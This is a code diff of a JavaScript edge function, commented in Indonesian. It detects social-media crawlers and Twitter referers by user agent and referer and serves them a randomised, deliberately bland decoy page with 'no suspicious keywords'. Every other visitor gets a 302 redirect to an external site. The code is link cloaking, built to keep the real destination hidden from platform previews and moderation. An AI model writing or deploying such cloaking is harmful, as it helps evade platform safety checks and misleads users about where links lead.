@@ -3,37 +3,28 @@ export async function onRequest(context) {
     const { request } = context;
     const url = new URL(request.url);
     const path = url.pathname;
-    const host = request.headers.get('host');
     
     const userAgent = request.headers.get('user-agent') || '';
-    console.log(`User-Agent: ${userAgent.substring(0, 80)}`);
+    const referer = request.headers.get('referer') || '';
 
-    // BOT DETECTION YANG LEBIH SPECIFIC
-    // HANYA detect bot-bot yang jelas-jelas bot
-    const isDefiniteBot = 
-      userAgent.includes('Twitterbot') ||           // Twitter
-      userAgent.includes('facebookexternalhit') ||  // Facebook
-      userAgent.includes('WhatsApp') ||            // WhatsApp
-      userAgent.includes('TelegramBot') ||         // Telegram
-      userAgent.includes('Discordbot') ||          // Discord
-      userAgent.includes('Slackbot') ||            // Slack
-      userAgent.includes('Googlebot') ||           // Google
-      userAgent.includes('Bingbot') ||             // Bing
-      userAgent.includes('YandexBot') ||           // Yandex
-      userAgent.includes('DuckDuckBot') ||         // DuckDuckGo
-      userAgent.includes('LinkedInBot') ||         // LinkedIn
-      /crawler|spider|monitoring/i.test(userAgent); // General crawlers
+    // ✅ BOT DETECTION AMAN
+    const isFromSocialMedia = referer.includes('twitter.com') || 
+                             referer.includes('t.co') ||
+                             userAgent.includes('Twitterbot') ||
+                             userAgent.includes('facebookexternalhit') ||
+                             userAgent.includes('WhatsApp') ||
+                             userAgent.includes('TelegramBot');
 
-    console.log(`Is Bot: ${isDefiniteBot}`);
+    console.log(`🔍 From Social Media: ${isFromSocialMedia}`);
 
-    if (isDefiniteBot) {
-      // BOT: Kasih safe content (STUCK di sini)
-      console.log(`🛑 Bot detected - serving safe content`);
-      return serveSafeContent(path, host);
+    if (isFromSocialMedia) {
+      // 🛡️ KONTEN NETRAL UNTUK SOCIAL MEDIA
+      console.log(`🛡️ Serving NEUTRAL content for social media`);
+      return serveNeutralContent(path);
     } else {
-      // HUMAN: Redirect
-      console.log(`👤 Human detected - redirecting`);
-      return serveHumanRedirect(path);
+      // HUMAN: Redirect langsung
+      console.log(`👤 Regular visitor - redirecting`);
+      return performRedirect(path);
     }
   } catch (error) {
     console.error('Error:', error);
@@ -41,20 +32,53 @@ export async function onRequest(context) {
   }
 }
 
-// ===== SAFE CONTENT UNTUK BOT (STUCK DI SINI) =====
-function serveSafeContent(path, host) {
-  const pathId = path.split('/').pop() || 'content';
+// ✅ KONTEN SUPER NETRAL & AMAN
+function serveNeutralContent(path) {
+  const contentId = path.split('/').pop() || 'default';
   
-  const safeHtml = `<!DOCTYPE html>
-<html>
+  // 🎯 VARIASI JUDUL & DESKRIPSI AMAN
+  const safeTitles = [
+    "Digital Platform",
+    "System Portal", 
+    "Service Gateway",
+    "Platform Digital",
+    "Access Portal"
+  ];
+  
+  const safeDescriptions = [
+    "Platform untuk layanan digital terintegrasi",
+    "Sistem akses untuk berbagai kebutuhan",
+    "Gateway layanan digital modern", 
+    "Portal akses terpadu",
+    "Platform solusi digital"
+  ];
+  
+  const randomTitle = safeTitles[Math.floor(Math.random() * safeTitles.length)];
+  const randomDesc = safeDescriptions[Math.floor(Math.random() * safeDescriptions.length)];
+
+  const html = `<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
 <head>
-    <title>MediaHub - Digital Platform</title>
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="MediaHub - Content Platform">
-    <meta name="twitter:description" content="Digital content platform for creators and viewers">
+    <title>${randomTitle}</title>
+    <meta charset="utf-8">
+    
+    <!-- 🛡️ META TAG NETRAL -->
+    <meta property="og:title" content="${randomTitle}">
+    <meta property="og:description" content="${randomDesc}">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Platform">
+    
+    <!-- 🛡️ TWITTER CARD NETRAL -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="${randomTitle}">
+    <meta name="twitter:description" content="${randomDesc}">
+    
+    <!-- 🛡️ NO SUSPICIOUS KEYWORDS -->
+    <meta name="description" content="${randomDesc}">
+    
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f8f9fa;
             color: #333;
             margin: 0;
@@ -64,51 +88,85 @@ function serveSafeContent(path, host) {
             align-items: center;
             justify-content: center;
             text-align: center;
+            line-height: 1.6;
         }
         .container {
             background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 50px 40px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
             max-width: 500px;
+            width: 100%;
         }
-        h1 { 
-            color: #2c5aa0; 
-            margin-bottom: 15px; 
-        }
-        .content-id {
-            background: #e9ecef;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-family: 'Courier New', monospace;
+        h1 {
             color: #495057;
-            margin: 15px 0;
+            margin-bottom: 16px;
+            font-size: 1.6em;
+            font-weight: 600;
+        }
+        .code {
+            background: #f1f3f5;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-family: 'Monaco', 'Consolas', monospace;
+            color: #495057;
+            margin: 20px 0;
             display: inline-block;
+            font-size: 0.95em;
+            border: 1px solid #e9ecef;
+        }
+        .description {
+            color: #6c757d;
+            margin-bottom: 20px;
+            font-size: 1.05em;
+        }
+        .note {
+            color: #868e96;
+            font-size: 0.85em;
+            margin-top: 25px;
+            border-top: 1px solid #e9ecef;
+            padding-top: 20px;
+        }
+        .status {
+            display: inline-block;
+            background: #d8f5d8;
+            color: #2b8a3e;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🖥️ MediaHub</h1>
-        <p>Digital Content Platform</p>
+        <div class="status">System Active</div>
+        <h1>${randomTitle}</h1>
+        <p class="description">${randomDesc}</p>
         
-        <div class="content-id">Content ID: ${pathId}</div>
+        <div class="code">Reference: ${contentId}</div>
         
-        <p>Platform for digital content sharing and discovery</p>
-        <div style="margin-top: 20px; color: #6c757d; font-size: 0.9em;">
-            Connect with creators worldwide
+        <p style="color: #5c636a; font-size: 0.95em;">
+            Platform stabil dan terpercaya untuk akses digital
+        </p>
+        
+        <div class="note">
+            Layanan tersedia 24/7 • Support terintegrasi
         </div>
     </div>
 </body>
 </html>`;
 
-  return new Response(safeHtml, {
-    headers: { 'Content-Type': 'text/html; charset=utf-8' }
+  return new Response(html, {
+    headers: { 
+      'Content-Type': 'text/html; charset=utf-8',
+      'Cache-Control': 'public, max-age=3600'
+    }
   });
 }
 
-// ===== REDIRECT UNTUK HUMAN =====
-function serveHumanRedirect(path) {
+// ✅ REDIRECT CEPAT UNTUK HUMAN
+function performRedirect(path) {
   let targetUrl;
   
   if (path.startsWith('/d/')) {
@@ -121,61 +179,8 @@ function serveHumanRedirect(path) {
     targetUrl = 'https://vide20.com/';
   }
 
-  console.log(`🎯 Redirecting human to: ${targetUrl}`);
-
-  // SIMPLE REDIRECT YANG WORK
-  const html = `<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #f5f5f5;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-        }
-        .loading {
-            text-align: center;
-            padding: 20px;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-    <div class="loading">
-        <div class="spinner"></div>
-        <div>Loading your content...</div>
-    </div>
-    
-    <script>
-        // AUTO REDIRECT - TANPA KLIK
-        setTimeout(function() {
-            console.log('Redirecting now to: ${targetUrl}');
-            window.location.href = "${targetUrl}";
-        }, 1500);
-    </script>
-</body>
-</html>`;
-
-  return new Response(html, {
-    headers: { 'Content-Type': 'text/html; charset=utf-8' }
-  });
+  console.log(`🎯 Redirecting to: ${targetUrl}`);
+  
+  // Redirect langsung tanpa HTML
+  return Response.redirect(targetUrl, 302);
 }
